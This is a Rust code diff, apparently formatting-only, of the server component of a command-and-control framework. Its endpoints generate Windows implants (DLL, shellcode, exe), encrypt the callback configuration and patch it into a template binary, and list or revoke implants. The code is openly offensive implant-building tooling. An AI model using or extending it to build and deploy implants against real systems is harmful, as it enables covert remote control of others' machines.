@@ -30,7 +30,7 @@
 use std::sync::Arc;
 
 use axum::{extract::State, http::StatusCode, Json};
-use nyx_mutate::{Mutator, MutationPasses};
+use nyx_mutate::{MutationPasses, Mutator};
 use nyx_protocol::wire::Writer;
 use rand::RngCore;
 use serde::{Deserialize, Serialize};
@@ -63,10 +63,7 @@ fn clamp_scalar(mut s: [u8; 32]) -> [u8; 32] {
 ///
 /// This MUST match `derive_config_key` in
 /// `crates/implant-win/src/config_placeholder.rs`.
-fn derive_config_key_server(
-    implant_priv: &[u8; 32],
-    server_pub: &[u8; 32],
-) -> Option<[u8; 32]> {
+fn derive_config_key_server(implant_priv: &[u8; 32], server_pub: &[u8; 32]) -> Option<[u8; 32]> {
     let implant_pub = nyx_protocol::crypto::public_from_secret(implant_priv)?;
     let shared = nyx_protocol::crypto::ecdh(implant_priv, server_pub)?;
     let mut info = [0u8; 64];
@@ -280,25 +277,19 @@ pub async fn generate_implant(
     State(st): State<Arc<AppState>>,
     Json(req): Json<GenerateRequest>,
 ) -> Result<Json<GenerateResponse>, (StatusCode, String)> {
-    let template = st
-        .template
-        .as_ref()
-        .ok_or_else(|| {
-            (
-                StatusCode::SERVICE_UNAVAILABLE,
-                "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
-            )
-        })?;
+    let template = st.template.as_ref().ok_or_else(|| {
+        (
+            StatusCode::SERVICE_UNAVAILABLE,
+            "implant generation disabled: no DLL template loaded (set NYX_TEMPLATE)".into(),
+        )
+    })?;
 
-    let implant_store = st
-        .implants
-        .as_ref()
-        .ok_or_else(|| {
-            (
-                StatusCode::SERVICE_UNAVAILABLE,
-                "implant generation disabled: no implant store".into(),
-            )
-        })?;
+    let implant_store = st.implants.as_ref().ok_or_else(|| {
+        (
+            StatusCode::SERVICE_UNAVAILABLE,
+            "implant generation disabled: no implant store".into(),
+        )
+    })?;
 
     // Validate inputs.
     if req.callback.is_empty() || req.callback.len() > 255 {
@@ -308,10 +299,7 @@ pub async fn generate_implant(
         ));
     }
     if req.jitter > 100 {
-        return Err((
-            StatusCode::BAD_REQUEST,
-            "jitter must be 0-100".into(),
-        ));
+        return Err((StatusCode::BAD_REQUEST, "jitter must be 0-100".into()));
     }
     if !matches!(req.format.as_str(), "dll" | "shellcode" | "exe") {
         return Err((
@@ -400,38 +388,39 @@ pub async fn generate_implant(
     }
 
     // Derive implant public key from the clamped private key.
-    let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv)
-        .ok_or_else(|| {
-            (
-                StatusCode::INTERNAL_SERVER_ERROR,
-                "failed to derive implant public key".into(),
-            )
-        })?;
+    let implant_pub = nyx_protocol::crypto::public_from_secret(&implant_priv).ok_or_else(|| {
+        (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            "failed to derive implant public key".into(),
+        )
+    })?;
 
     // Derive config_key via ECDH(implant_priv, server_pub) + HKDF, matching
     // the implant's derive_config_key exactly.
-    let config_key = derive_config_key_server(&implant_priv, &server_pub)
-        .ok_or_else(|| {
-            (
-                StatusCode::INTERNAL_SERVER_ERROR,
-                "failed to derive config encryption key".into(),
-            )
-        })?;
+    let config_key = derive_config_key_server(&implant_priv, &server_pub).ok_or_else(|| {
+        (
+            StatusCode::INTERNAL_SERVER_ERROR,
+            "failed to derive config encryption key".into(),
+        )
+    })?;
 
     // 2. Build config plaintext.
     // Layout: str(callback) | u16(port) | str(uri) | u32(sleep) | u8(jitter) | u8(tls)
     //        | u8(has_token=1) | blob(auth_token 32B)
     //        | u32(features) | u32(keying) | u64(expires_at)
     let mut pw = Writer::new();
-    pw.str(&req.callback).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    pw.str(&req.callback)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
     pw.u16(req.port);
-    pw.str(&req.uri).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    pw.str(&req.uri)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
     pw.u32(req.sleep);
     pw.u8(req.jitter);
     pw.u8(if req.tls { 1 } else { 0 });
     // auth_token: always present for server-generated implants
     pw.u8(1);
-    pw.blob(&auth_token).map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
+    pw.blob(&auth_token)
+        .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, e.to_string()))?;
     pw.u32(req.features);
     pw.u32(req.keying);
     let expires_ts: u64 = req
@@ -453,8 +442,19 @@ pub async fn generate_implant(
         let cipher = ChaCha20Poly1305::new(Key::from_slice(&config_key));
         let nonce = Nonce::from_slice(&config_nonce);
         cipher
-            .encrypt(nonce, Payload { msg: &config_plaintext, aad: b"" })
-            .map_err(|e| (StatusCode::INTERNAL_SERVER_ERROR, format!("encrypt failed: {e}")))?
+            .encrypt(
+                nonce,
+                Payload {
+                    msg: &config_plaintext,
+                    aad: b"",
+                },
+            )
+            .map_err(|e| {
+                (
+                    StatusCode::INTERNAL_SERVER_ERROR,
+                    format!("encrypt failed: {e}"),
+                )
+            })?
     };
     // ct_with_tag = ciphertext || 16B Poly1305 tag
 
@@ -520,8 +520,12 @@ pub async fn generate_implant(
     let placeholder_offset = binary
         .windows(8)
         .position(|w| {
-            w[0] == 0x41 && w[1] == 0x41 && w[2] == 0x41 && w[3] == 0x41
-                && w[4] == 0xAA && w[5] == 0xAA
+            w[0] == 0x41
+                && w[1] == 0x41
+                && w[2] == 0x41
+                && w[3] == 0x41
+                && w[4] == 0xAA
+                && w[5] == 0xAA
         })
         .ok_or_else(|| {
             (
@@ -659,7 +663,11 @@ pub async fn generate_implant(
         sha256,
         size_bytes: binary.len(),
         format: req.format,
-        message: Some(format!("implant {id} ready — {len} bytes", id = id, len = binary.len())),
+        message: Some(format!(
+            "implant {id} ready — {len} bytes",
+            id = id,
+            len = binary.len()
+        )),
         binary: if req.deliver.as_deref() == Some("inline") {
             use base64::{engine::general_purpose::STANDARD, Engine};
             Some(STANDARD.encode(&binary))
@@ -673,12 +681,10 @@ pub async fn generate_implant(
 pub async fn list_implants(
     State(st): State<Arc<AppState>>,
 ) -> Result<Json<ImplantListResponse>, (StatusCode, String)> {
-    let store = st.implants.as_ref().ok_or_else(|| {
-        (
-            StatusCode::SERVICE_UNAVAILABLE,
-            "no implant store".into(),
-        )
-    })?;
+    let store = st
+        .implants
+        .as_ref()
+        .ok_or_else(|| (StatusCode::SERVICE_UNAVAILABLE, "no implant store".into()))?;
 
     let records = store.list().map_err(|e| {
         (
@@ -718,12 +724,10 @@ pub async fn revoke_implant(
     State(st): State<Arc<AppState>>,
     Json(req): Json<RevokeRequest>,
 ) -> Result<Json<serde_json::Value>, (StatusCode, String)> {
-    let store = st.implants.as_ref().ok_or_else(|| {
-        (
-            StatusCode::SERVICE_UNAVAILABLE,
-            "no implant store".into(),
-        )
-    })?;
+    let store = st
+        .implants
+        .as_ref()
+        .ok_or_else(|| (StatusCode::SERVICE_UNAVAILABLE, "no implant store".into()))?;
 
     let revoked = store.revoke(&req.implant_pub).map_err(|e| {
         (
